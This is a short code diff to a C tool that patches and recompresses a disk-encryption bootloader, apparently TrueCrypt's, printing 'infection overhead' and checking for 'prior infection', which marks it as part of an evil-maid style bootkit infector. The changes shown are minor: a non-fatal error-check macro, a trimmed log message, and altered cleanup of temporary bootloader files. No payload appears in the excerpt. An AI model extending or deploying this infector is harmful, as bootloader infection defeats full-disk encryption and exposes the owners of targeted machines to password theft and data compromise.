@@ -29,6 +29,7 @@
 #define TC_COM_EXECUTABLE_OFFSET 0x100
 
 #define CHK(x) {if((x) < 0) { perror(#x); exit(-1); }}
+#define WEAK_CHK(x) {if((x) < 0) { perror(#x);}}
 #define CHK_NOT0(x) {if((x) != 0) { perror(#x); exit(-1); }}
 #define CHK_NULL(x) {if((x) == NULL) { perror(#x); exit(-1); }}
 #define ADJUST(x) (x+2*512)//(((x)/512)*512+2*512)
@@ -100,8 +101,8 @@ int main(int argc, char* argv[]) {
     CHK(bootloader_fd);
     struct stat bl_st;
     CHK(fstat(bootloader_fd, &bl_st));
-    printf("uncompressed bootloader size = 0x%x (0x%x required memory)\n",
-            (unsigned int)bl_st.st_size, (unsigned int)ADJUST(bl_st.st_size));
+    printf("uncompressed bootloader size = 0x%x\n",
+            (unsigned int)bl_st.st_size);
     printf("infection overhead = 0x%x\n", INFECTION_OVERHEAD);
     size_t uncompressed_bl_sz = get_tc_mem_required(mbr, SECTOR_SIZE);
     size_t infected_bl_sz = uncompressed_bl_sz + INFECTION_OVERHEAD;
@@ -110,6 +111,8 @@ int main(int argc, char* argv[]) {
     memset(bootloader, 0, infected_bl_sz);
     CHK(read(bootloader_fd, bootloader, uncompressed_bl_sz));
     //write(1, bootloader, uncompressed_bl_sz);
+    
+    WEAK_CHK(unlink(DECOMPRESSED_BOOTLOADER_FILE));
     
     /* Checking if the bootloader is already infected */
     puts("Checking for prior infection...");
@@ -162,7 +165,7 @@ int main(int argc, char* argv[]) {
     CHK(close(comp_patched_bl_fd));
     free(bootloader);
     free(recomp_bootloader);
-    unlink(DECOMPRESSED_BOOTLOADER_FILE);
+    WEAK_CHK(unlink(COMPRESSED_PATCHED_BOOTLOADER_FILE));
     return 0;
 }
 
